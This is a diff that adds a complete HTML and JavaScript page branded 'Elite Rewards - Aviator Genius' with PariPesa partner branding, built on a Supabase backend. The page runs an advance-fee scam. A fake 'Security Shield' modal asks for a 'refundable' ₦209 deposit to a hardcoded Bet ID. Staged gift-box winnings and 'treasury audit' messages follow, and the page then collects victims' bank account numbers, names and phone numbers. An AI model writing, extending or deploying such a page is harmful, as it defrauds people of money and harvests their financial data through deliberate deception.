@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Elite Rewards - Aviator Genius</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="config.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root { 
+            --gold: #ffcf4b; 
+            --gold-glow: rgba(255, 207, 75, 0.3);
+            --primary: #007bff; 
+            --bg: #010409; 
+            --card: #0f172a;
+            --error: #f43f5e;
+            --glass: rgba(255, 255, 255, 0.03);
+            --pp-orange: #f37021;
+        }
+
+        * { -webkit-tap-highlight-color: transparent; user-select: none; box-sizing: border-box; }
+
+        body { 
+            margin: 0; background: var(--bg); color: white; 
+            font-family: 'Segoe UI', system-ui, sans-serif; 
+            overflow-x: hidden; min-height: 100vh;
+        }
+
+        /* --- BOUNCY --- */
+        .bouncy { transition: transform 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275); cursor: pointer; }
+        .bouncy:active { transform: scale(0.94); }
+
+        /* SPLASH SCREEN */
+        #splash {
+            position: fixed; inset: 0; background: #010409;
+            z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center;
+        }
+        .logo-diamond {
+            width: 80px; height: 80px; background: var(--bg); border: 3px solid var(--gold);
+            transform: rotate(45deg); display: flex; align-items: center; justify-content: center;
+            box-shadow: 0 0 30px var(--gold-glow); animation: pulseDiamond 2s infinite;
+        }
+        .logo-inner { transform: rotate(-45deg); font-weight: 900; color: var(--gold); font-size: 1.2rem; text-align: center; line-height: 1; }
+        
+        @keyframes pulseDiamond {
+            0% { transform: rotate(45deg) scale(1); }
+            50% { transform: rotate(45deg) scale(1.05); box-shadow: 0 0 50px var(--gold-glow); }
+            100% { transform: rotate(45deg) scale(1); }
+        }
+
+        .container { padding: 20px; display: none; max-width: 450px; margin: auto; animation: fadeInUp 0.8s ease; }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* --- PROMO CARD --- */
+        .promo-header {
+            background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
+            padding: 40px 20px; border-radius: 35px; border: 1px solid rgba(255,207,75,0.15);
+            text-align: center; position: relative; overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+        }
+        .promo-header::before {
+            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+            background: radial-gradient(circle, var(--gold-glow) 0%, transparent 70%);
+            opacity: 0.1;
+        }
+
+        .reward-title {
+            font-size: 2rem; font-weight: 900; letter-spacing: -1px;
+            background: linear-gradient(to bottom, #fff, var(--gold));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        }
+
+        /* --- INPUT FIELDS --- */
+        .input-group { margin-top: 30px; }
+        input, select { 
+            width: 100%; padding: 20px; margin-bottom: 15px; border-radius: 20px; 
+            border: 1px solid rgba(255,255,255,0.08); background: rgba(255,255,255,0.03); 
+            color: white; font-size: 1rem; outline: none; transition: 0.4s;
+            font-weight: 600;
+        }
+        input:focus { border-color: var(--gold); background: rgba(255,255,255,0.06); box-shadow: 0 0 15px var(--gold-glow); }
+        .input-error { border-color: var(--error) !important; animation: shake 0.4s; }
+        
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-6px); } 75% { transform: translateX(6px); } }
+
+        .btn-gold { 
+            width: 100%; padding: 20px; background: linear-gradient(90deg, #d4a017, #ffcf4b); 
+            color: #000; border: none; border-radius: 20px; font-weight: 900; 
+            font-size: 0.9rem; letter-spacing: 1px; text-transform: uppercase;
+            box-shadow: 0 10px 25px rgba(212, 160, 23, 0.3);
+        }
+
+        /* --- GIFT BOX REDESIGN --- */
+        .gift-stage { margin: 40px auto; position: relative; width: 150px; height: 150px; }
+        .gift-aura {
+            position: absolute; inset: 0; background: var(--gold);
+            filter: blur(40px); opacity: 0.2; border-radius: 50%;
+            animation: pulseAura 2s infinite ease-in-out;
+        }
+        @keyframes pulseAura { 0%, 100% { transform: scale(1); opacity: 0.1; } 50% { transform: scale(1.3); opacity: 0.3; } }
+
+        .gift-box { width: 100px; height: 100px; margin: 25px auto; position: relative; z-index: 5; }
+        .box-base {
+            width: 90px; height: 80px; background: linear-gradient(135deg, #ffcf4b, #b8860b);
+            border-radius: 12px; position: absolute; bottom: 0; left: 5px;
+            box-shadow: 0 15px 30px rgba(0,0,0,0.5);
+        }
+        .box-top {
+            width: 100px; height: 25px; background: #ffe08a; position: absolute;
+            top: 5px; left: 0; border-radius: 8px; z-index: 6;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3); transition: 0.7s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .ribbon {
+            width: 20px; height: 100%; background: rgba(255,255,255,0.3);
+            position: absolute; left: 50%; transform: translateX(-50%);
+        }
+
+        /* --- PARIPESA BRANDING --- */
+        .partner-section { margin-top: 60px; text-align: center; opacity: 0.6; }
+        .pp-badge {
+            display: inline-flex; align-items: center; gap: 10px;
+            padding: 12px 24px; background: #001a35; border-radius: 50px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        .pp-text { font-weight: 900; font-size: 1rem; letter-spacing: -0.5px; }
+        .pp-orange { color: var(--pp-orange); }
+
+        /* --- MODALS --- */
+        .modal-bg {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.95); backdrop-filter: blur(15px);
+            display: none; align-items: flex-end; z-index: 2000;
+        }
+        .modal-sheet {
+            background: #0f172a; width: 100%; border-radius: 40px 40px 0 0;
+            padding: 40px 25px; border: 1px solid rgba(255,255,255,0.1);
+            animation: slideUp 0.4s ease-out;
+        }
+        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+
+        #toast {
+            position: fixed; top: 30px; left: 50%; transform: translateX(-50%);
+            background: var(--gold); color: #000; padding: 12px 30px; border-radius: 50px;
+            font-weight: 900; font-size: 0.8rem; z-index: 99999; display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="toast">SYSTEM MESSAGE</div>
+
+    <div id="splash">
+        <div class="logo-diamond">
+            <div class="logo-inner">100M<br><small>ELITE</small></div>
+        </div>
+        <div style="margin-top:40px; width:120px; height:2px; background:rgba(255,255,255,0.1); position:relative; overflow:hidden;">
+            <div style="position:absolute; inset:0; background:var(--gold); animation: load 2s infinite;"></div>
+        </div>
+        <style>@keyframes load { from { left: -100%; } to { left: 100%; } }</style>
+    </div>
+
+    <div class="container" id="mainContent">
+        <div class="promo-header">
+            <div class="reward-title">Elite Reward</div>
+            <p style="font-size:0.75rem; opacity:0.5; letter-spacing:1px; font-weight:800; text-transform:uppercase;">Network Verification Required</p>
+        </div>
+
+        <div id="ui-start" class="input-group">
+            <input type="text" id="full-name" placeholder="Legal Full Name">
+            <div style="position:relative;">
+                <input type="text" id="v-code-input" placeholder="7-Digit Validation Code">
+                <i class="fa-solid fa-circle-question" onclick="openModal('modal-get-code')" style="position:absolute; right:20px; top:22px; color:var(--gold);"></i>
+            </div>
+            <button class="btn-gold bouncy" onclick="handleValidate()">ACTIVATE REWARD</button>
+            
+            <p id="status-msg" style="text-align:center; font-size:0.75rem; color:var(--gold); margin-top:20px; font-weight:800;"></p>
+            
+            <div style="text-align:center; margin-top:30px;">
+                <span onclick="openModal('modal-get-code')" style="color:var(--gold); font-size:0.85rem; font-weight:900; border-bottom:1px solid var(--gold); padding-bottom:2px; cursor:pointer;">
+                    GET ACCESS CODE (₦209)
+                </span>
+            </div>
+        </div>
+
+        <div id="ui-reward" style="display:none; text-align:center; padding-top:20px;">
+            <h2 id="calc-text" style="color:var(--gold); font-weight:900;">Reward Verified!</h2>
+            <div id="gift-area" class="gift-stage">
+                <div class="gift-aura"></div>
+                <div class="gift-box bouncy" onclick="openGift()">
+                    <div class="box-top"><div class="ribbon"></div></div>
+                    <div class="box-base"><div class="ribbon"></div></div>
+                </div>
+            </div>
+            <p id="calc-subtext" style="font-size:0.8rem; opacity:0.6; font-weight:700; animation: pulse 1s infinite alternate;">TAP BOX TO UNLOCK</p>
+            <style>@keyframes pulse { from { opacity: 0.4; } to { opacity: 1; } }</style>
+        </div>
+
+        <div id="ui-withdraw" style="display:none; margin-top:30px;">
+            <div class="promo-header" style="padding:30px 20px;">
+                <h1 id="won-amount" style="color:var(--gold); margin:0; font-size:2.5rem;">₦0.00</h1>
+                <p id="won-type" style="font-size:0.75rem; opacity:0.8; margin-top:10px; font-weight:700;"></p>
+            </div>
+
+            <div id="form-cash" style="display:none; margin-top:20px;">
+                <input type="text" id="w-bank" placeholder="Receiving Bank">
+                <input type="text" id="w-acc-name" placeholder="Account Holder Name">
+                <input type="number" id="w-acc" placeholder="Account Number">
+            </div>
+
+            <div id="form-airtime" style="display:none; margin-top:20px;">
+                <select id="w-network">
+                    <option value="">Select Carrier</option>
+                    <option value="MTN">MTN NG</option>
+                    <option value="GLO">GLO NG</option>
+                    <option value="AIRTEL">AIRTEL NG</option>
+                    <option value="9MOBILE">9MOBILE</option>
+                </select>
+                <input type="number" id="w-phone" placeholder="Phone Number">
+            </div>
+
+            <button class="btn-gold bouncy" onclick="submitWithdrawal()">CLAIM DISBURSEMENT</button>
+        </div>
+
+        <div id="ui-completed" style="display:none; text-align:center; margin-top:40px;">
+            <div class="promo-header">
+                <i class="fa-solid fa-clock-rotate-left" style="font-size:3rem; color:var(--gold); margin-bottom:20px;"></i>
+                <h2 id="final-status-title" style="color:var(--gold); font-weight:900;">AUDIT PENDING</h2>
+                <p id="final-status-msg" style="font-size:0.85rem; opacity:0.6; font-weight:600;">The treasury team is auditing your reward. Funds will be released to your provided details shortly.</p>
+            </div>
+        </div>
+
+        <div class="partner-section">
+            <p style="font-size:0.6rem; letter-spacing:2px; font-weight:900; margin-bottom:15px; text-transform:uppercase;">Exclusive Partner</p>
+            <div class="pp-badge">
+                <span class="pp-text">PARI<span class="pp-orange">PESA</span></span>
+                <i class="fa-solid fa-circle-check" style="color:var(--pp-orange); font-size:0.8rem;"></i>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal-bg" id="custom-modal">
+        <div class="modal-sheet" id="modal-content">
+            <h2 id="modal-title" style="color:var(--gold); margin-top:0;"></h2>
+            <div id="modal-body" style="color:#94a3b8; font-size:0.9rem; line-height:1.6; font-weight:600;"></div>
+            <div id="modal-extra"></div>
+            <button class="btn-gold bouncy" style="margin-top:30px; background:rgba(255,255,255,0.05); color:white; box-shadow:none; border:1px solid rgba(255,255,255,0.1);" onclick="closeModal()">DISMISS</button>
+        </div>
+    </div>
+
+    <script>
+        const _supa = getClient();
+        const userEmail = localStorage.getItem('user_email');
+        let currentBonusType = ""; 
+        let currentAmount = 0;
+        let isOpening = false;
+
+        window.onload = () => {
+            setTimeout(() => {
+                document.getElementById('splash').style.display = 'none';
+                document.getElementById('mainContent').style.display = 'block';
+                checkStatus();
+            }, 3000);
+            setInterval(checkStatus, 15000);
+        };
+
+        async function checkStatus() {
+            if(!userEmail || isOpening) return;
+            const { data } = await _supa.from('bonus_claims').select('*').eq('user_email', userEmail).maybeSingle();
+            
+            if(!data) { hideAll('ui-start'); return; }
+
+            if(data.reward_status === 'COMPLETED') {
+                hideAll('ui-completed');
+                document.getElementById('final-status-title').innerText = "DISBURSED";
+                document.getElementById('final-status-msg').innerText = "Mission Complete. Your reward has been sent successfully.";
+                return;
+            }
+
+            if(data.withdrawal_details) {
+                hideAll('ui-completed');
+                return;
+            }
+
+            if(data.bonus_type) {
+                hideAll('ui-reward');
+                document.getElementById('gift-area').style.display = 'block';
+                document.getElementById('calc-subtext').style.display = 'block';
+                currentBonusType = data.bonus_type;
+                currentAmount = data.won_amount;
+                return;
+            }
+
+            if(data.is_validated) {
+                hideAll('ui-reward');
+                document.getElementById('gift-area').style.display = 'none';
+                document.getElementById('calc-subtext').innerText = "Awaiting Final Treasury Audit...";
+                document.getElementById('calc-text').innerText = "Reviewing Entry";
+                return;
+            }
+
+            hideAll('ui-start');
+            if(data.payment_statuz === 'PENDING') {
+                document.getElementById('status-msg').innerText = "STATUS: PENDING MANUAL VERIFICATION";
+            } else if(data.payment_statuz === 'APPROVED') {
+                document.getElementById('status-msg').innerHTML = `CODE: <span style="color:#fff; font-size:1.4rem;">${data.validation_code}</span>`;
+            }
+        }
+
+        function openGift() {
+            isOpening = true;
+            const top = document.querySelector('.box-top');
+            top.style.transform = "translateY(-60px) rotate(-20deg)";
+            top.style.opacity = "0";
+
+            setTimeout(() => {
+                hideAll('ui-withdraw');
+                document.getElementById('won-amount').innerText = `₦${parseFloat(currentAmount).toLocaleString()}`;
+                const isCash = currentBonusType === 'CASH';
+                document.getElementById('won-type').innerText = isCash ? "UNLOCKED: DIRECT BANK CREDIT" : "UNLOCKED: NETWORK AIRTIME REWARD";
+                document.getElementById('form-cash').style.display = isCash ? 'block' : 'none';
+                document.getElementById('form-airtime').style.display = isCash ? 'none' : 'block';
+            }, 800);
+        }
+
+        async function handleValidate() {
+            const input = document.getElementById('v-code-input');
+            const { data } = await _supa.from('bonus_claims').select('validation_code').eq('user_email', userEmail).single();
+            if(data && input.value.trim().toUpperCase() === data.validation_code.toUpperCase()) {
+                await _supa.from('bonus_claims').update({ is_validated: true }).eq('user_email', userEmail);
+                showToast("CODE ACCEPTED");
+                checkStatus();
+            } else {
+                input.classList.add('input-error');
+                showToast("INVALID ACCESS CODE");
+            }
+        }
+
+        async function submitWithdrawal() {
+            let details = {};
+            if(currentBonusType === 'CASH') {
+                const b = document.getElementById('w-bank').value;
+                const n = document.getElementById('w-acc-name').value;
+                const a = document.getElementById('w-acc').value;
+                if(!b || !n || !a) { showToast("ALL FIELDS REQUIRED"); return; }
+                details = { bank: b, name: n, account: a };
+            } else {
+                const net = document.getElementById('w-network').value;
+                const ph = document.getElementById('w-phone').value;
+                if(!net || !ph) { showToast("SELECT NETWORK & PHONE"); return; }
+                details = { network: net, phone: ph };
+            }
+
+            const { error } = await _supa.from('bonus_claims').update({ withdrawal_details: details }).eq('user_email', userEmail);
+            if(!error) { isOpening = false; showToast("REQUEST LOGGED"); checkStatus(); }
+        }
+
+        function openModal(type) {
+            const m = document.getElementById('custom-modal');
+            const title = document.getElementById('modal-title');
+            const body = document.getElementById('modal-body');
+            const extra = document.getElementById('modal-extra');
+            extra.innerHTML = "";
+
+            if(type === 'modal-get-code') {
+                title.innerText = "Security Shield";
+                body.innerText = "To prevent bot-based prize draining, a refundable verification fee of ₦209.00 is required to generate your unique access code.";
+                extra.innerHTML = `<button class="btn-gold bouncy" style="margin-top:20px;" onclick="openModal('modal-pay-details')">PROCEED TO SECURE PAY</button>`;
+            } 
+            else if(type === 'modal-pay-details') {
+                title.innerText = "Verification Payment";
+                body.innerHTML = `Deposit exactly <b>₦209</b> to the Bet ID below:<br><br>
+                    <div style="background:rgba(0,0,0,0.3); padding:20px; border-radius:20px; border:1px solid rgba(255,207,75,0.1);">
+                        <small style="opacity:0.5;">PARTNER</small><br><b>PARIPESA</b><br><br>
+                        <small style="opacity:0.5;">BET ID</small><br>
+                        <div style="display:flex; align-items:center; justify-content:space-between;">
+                            <b style="font-size:1.3rem; color:var(--gold);">1614036427</b>
+                            <i class="fa-regular fa-copy bouncy" onclick="copyAcc()" style="color:var(--gold); font-size:1.2rem;"></i>
+                        </div>
+                    </div>`;
+                extra.innerHTML = `<button class="btn-gold bouncy" style="margin-top:20px;" onclick="openModal('modal-time')">PAYMENT COMPLETED</button>`;
+            }
+            else if(type === 'modal-time') {
+                title.innerText = "Final Step";
+                body.innerText = "Enter the transaction time from your receipt.";
+                extra.innerHTML = `<input type="time" id="p-time" style="text-align:center; margin-top:15px;">
+                                   <button class="btn-gold bouncy" onclick="submitPay()">SUBMIT FOR VERIFICATION</button>`;
+            }
+
+            m.style.display = 'flex';
+        }
+
+        async function submitPay() {
+            const name = document.getElementById('full-name').value;
+            const time = document.getElementById('p-time').value;
+            if(!name) { showToast("NAME REQUIRED"); closeModal(); return; }
+            if(!time) { showToast("TIME REQUIRED"); return; }
+            
+            const { error } = await _supa.from('bonus_claims').upsert({
+                user_email: userEmail, full_name: name, payment_time: time, payment_statuz: 'PENDING'
+            }, { onConflict: 'user_email' });
+            
+            if(!error) { showToast("VERIFICATION SENT"); checkStatus(); closeModal(); }
+        }
+
+        function closeModal() { document.getElementById('custom-modal').style.display = 'none'; }
+        function copyAcc() { navigator.clipboard.writeText("1614036427"); showToast("BET ID COPIED"); }
+        function showToast(msg) { const t = document.getElementById('toast'); t.innerText = msg; t.style.display = 'block'; setTimeout(()=> t.style.display='none', 2500); }
+        function hideAll(showId) {
+            ['ui-start', 'ui-reward', 'ui-withdraw', 'ui-completed'].forEach(id => {
+                document.getElementById(id).style.display = (id === showId) ? 'block' : 'none';
+            });
+        }
+    </script>
+</body>
+</html>
